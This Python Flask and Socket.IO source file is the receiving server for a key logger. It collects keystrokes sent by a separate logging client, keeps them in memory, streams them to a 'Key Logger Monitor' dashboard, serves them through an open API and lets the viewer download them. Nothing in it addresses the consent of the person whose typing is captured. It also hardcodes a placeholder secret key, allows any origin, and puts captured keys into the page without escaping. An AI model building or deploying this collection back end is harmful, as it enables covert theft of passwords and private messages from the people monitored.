#!/usr/bin/env python3
"""
Flask Server with WebSocket support for receiving keystrokes from key logger
"""

import logging
from datetime import datetime
from flask import Flask, render_template_string, request
from flask_socketio import SocketIO, emit
import json

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Create Flask app
app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key-here'
socketio = SocketIO(app, cors_allowed_origins="*")

# Store keystrokes in memory (in production, you'd want to use a database)
keystrokes = []
MAX_KEYSTROKES = 1000  # Limit to prevent memory issues

# HTML template for the web interface
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Key Logger Monitor</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: #f0f0f0;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .header {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
        }
        .stats {
            display: flex;
            justify-content: space-around;
            margin-bottom: 30px;
            padding: 20px;
            background-color: #f8f9fa;
            border-radius: 6px;
        }
        .stat-item {
            text-align: center;
        }
        .stat-number {
            font-size: 24px;
            font-weight: bold;
            color: #007bff;
        }
        .stat-label {
            font-size: 14px;
            color: #666;
            margin-top: 5px;
        }
        .keystroke-log {
            height: 400px;
            overflow-y: auto;
            border: 1px solid #ddd;
            padding: 10px;
            background-color: #f8f9fa;
            font-family: monospace;
            font-size: 12px;
        }
        .keystroke-entry {
            margin-bottom: 5px;
            padding: 5px;
            background-color: white;
            border-radius: 3px;
            border-left: 3px solid #007bff;
        }
        .keystroke-entry.release {
            border-left-color: #28a745;
        }
        .timestamp {
            color: #666;
            font-size: 10px;
        }
        .key-info {
            font-weight: bold;
            color: #333;
        }
        .controls {
            margin-bottom: 20px;
            text-align: center;
        }
        .btn {
            padding: 10px 20px;
            margin: 0 5px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .btn:hover {
            background-color: #0056b3;
        }
        .btn.danger {
            background-color: #dc3545;
        }
        .btn.danger:hover {
            background-color: #c82333;
        }
        .status {
            text-align: center;
            margin-bottom: 20px;
            padding: 10px;
            border-radius: 4px;
        }
        .status.connected {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .status.disconnected {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 Key Logger Monitor</h1>
            <p>Real-time keystroke monitoring and analysis</p>
        </div>
        
        <div id="status" class="status disconnected">
            Status: Disconnected
        </div>
        
        <div class="controls">
            <button class="btn" onclick="clearLog()">Clear Log</button>
            <button class="btn" onclick="downloadLog()">Download Log</button>
            <button class="btn danger" onclick="togglePause()">Pause</button>
        </div>
        
        <div class="stats">
            <div class="stat-item">
                <div class="stat-number" id="totalKeys">0</div>
                <div class="stat-label">Total Keys</div>
            </div>
            <div class="stat-item">
                <div class="stat-number" id="pressEvents">0</div>
                <div class="stat-label">Press Events</div>
            </div>
            <div class="stat-item">
                <div class="stat-number" id="releaseEvents">0</div>
                <div class="stat-label">Release Events</div>
            </div>
            <div class="stat-item">
                <div class="stat-number" id="lastActivity">-</div>
                <div class="stat-label">Last Activity</div>
            </div>
        </div>
        
        <div class="keystroke-log" id="keystrokeLog">
            <div style="text-align: center; color: #666; margin-top: 50px;">
                Waiting for keystrokes...
            </div>
        </div>
    </div>

    <script>
        const socket = io();
        let keystrokeCount = 0;
        let pressCount = 0;
        let releaseCount = 0;
        let isPaused = false;
        let keystrokeData = [];
        
        // Update status
        socket.on('connect', function() {
            document.getElementById('status').className = 'status connected';
            document.getElementById('status').textContent = 'Status: Connected';
        });
        
        socket.on('disconnect', function() {
            document.getElementById('status').className = 'status disconnected';
            document.getElementById('status').textContent = 'Status: Disconnected';
        });
        
        // Handle keystroke events
        socket.on('keystroke_broadcast', function(data) {
            if (isPaused) return;
            
            keystrokeCount++;
            keystrokeData.push(data);
            
            if (data.event === 'press') {
                pressCount++;
            } else {
                releaseCount++;
            }
            
            updateStats();
            addKeystrokeToLog(data);
        });
        
        function updateStats() {
            document.getElementById('totalKeys').textContent = keystrokeCount;
            document.getElementById('pressEvents').textContent = pressCount;
            document.getElementById('releaseEvents').textContent = releaseCount;
            document.getElementById('lastActivity').textContent = new Date().toLocaleTimeString();
        }
        
        function addKeystrokeToLog(data) {
            const logElement = document.getElementById('keystrokeLog');
            const entry = document.createElement('div');
            entry.className = `keystroke-entry ${data.event}`;
            
            const timestamp = new Date(data.timestamp).toLocaleTimeString();
            const keyDisplay = data.key_char || data.key_name;
            
            entry.innerHTML = `
                <div class="timestamp">${timestamp}</div>
                <div class="key-info">${data.event.toUpperCase()}: ${keyDisplay}</div>
            `;
            
            // Clear initial message
            if (logElement.children.length === 1 && logElement.children[0].style.textAlign === 'center') {
                logElement.innerHTML = '';
            }
            
            logElement.appendChild(entry);
            logElement.scrollTop = logElement.scrollHeight;
            
            // Limit entries to prevent memory issues
            if (logElement.children.length > 1000) {
                logElement.removeChild(logElement.firstChild);
            }
        }
        
        function clearLog() {
            document.getElementById('keystrokeLog').innerHTML = `
                <div style="text-align: center; color: #666; margin-top: 50px;">
                    Log cleared. Waiting for keystrokes...
                </div>
            `;
            keystrokeCount = 0;
            pressCount = 0;
            releaseCount = 0;
            keystrokeData = [];
            updateStats();
        }
        
        function downloadLog() {
            const dataStr = JSON.stringify(keystrokeData, null, 2);
            const dataBlob = new Blob([dataStr], {type: 'application/json'});
            const url = URL.createObjectURL(dataBlob);
            const link = document.createElement('a');
            link.href = url;
            link.download = `keystrokes_${new Date().toISOString().split('T')[0]}.json`;
            link.click();
            URL.revokeObjectURL(url);
        }
        
        function togglePause() {
            isPaused = !isPaused;
            const btn = event.target;
            btn.textContent = isPaused ? 'Resume' : 'Pause';
            btn.className = isPaused ? 'btn' : 'btn danger';
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    """Serve the web interface"""
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/keystrokes')
def get_keystrokes():
    """API endpoint to get recent keystrokes"""
    return {
        'keystrokes': keystrokes[-100:],  # Return last 100 keystrokes
        'total_count': len(keystrokes),
        'timestamp': datetime.now().isoformat()
    }

@socketio.on('connect')
def handle_connect():
    """Handle client connection"""
    logger.info(f"Client connected: {request.sid}")
    emit('status', {'message': 'Connected to key logger server'})

@socketio.on('disconnect')
def handle_disconnect():
    """Handle client disconnection"""
    logger.info(f"Client disconnected: {request.sid}")

@socketio.on('keystroke')
def handle_keystroke(data):
    """Handle keystroke data from key logger"""
    logger.info(f"Received keystroke: {data.get('key_name', 'unknown')}")
    
    # Store keystroke
    keystrokes.append(data)
    
    # Limit stored keystrokes to prevent memory issues
    if len(keystrokes) > MAX_KEYSTROKES:
        keystrokes.pop(0)
    
    # Broadcast to all connected web clients
    socketio.emit('keystroke_broadcast', data)

@socketio.on('get_recent_keystrokes')
def handle_get_recent_keystrokes():
    """Send recent keystrokes to client"""
    emit('recent_keystrokes', keystrokes[-50:])  # Send last 50 keystrokes

def main():
    """Main function to run the Flask server"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Flask server for key logger')
    parser.add_argument(
        '--host', 
        default='0.0.0.0',
        help='Host to bind to (default: 0.0.0.0)'
    )
    parser.add_argument(
        '--port', 
        type=int, 
        default=5000,
        help='Port to bind to (default: 5000)'
    )
    parser.add_argument(
        '--debug', 
        action='store_true',
        help='Enable debug mode'
    )
    
    args = parser.parse_args()
    
    logger.info("=== Flask Key Logger Server Starting ===")
    logger.info(f"Server will be available at: http://{args.host}:{args.port}")
    logger.info(f"Web interface: http://{args.host}:{args.port}/")
    logger.info(f"API endpoint: http://{args.host}:{args.port}/api/keystrokes")
    
    try:
        socketio.run(
            app, 
            host=args.host, 
            port=args.port, 
            debug=args.debug,
            allow_unsafe_werkzeug=True
        )
    except Exception as e:
        logger.error(f"Error starting server: {e}")

if __name__ == "__main__":
    main() 